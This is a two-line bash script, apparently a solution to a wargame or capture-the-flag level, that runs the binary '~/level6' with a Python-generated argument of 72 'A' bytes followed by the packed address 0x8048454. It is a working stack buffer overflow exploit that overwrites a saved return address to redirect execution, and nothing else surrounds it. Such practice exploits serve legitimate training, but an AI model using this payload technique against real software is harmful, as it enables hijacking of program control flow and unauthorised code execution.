#!/bin/bash

~/level6 $(python -c 'import struct; print 72*"A" + struct.pack("I", 0x8048454)')
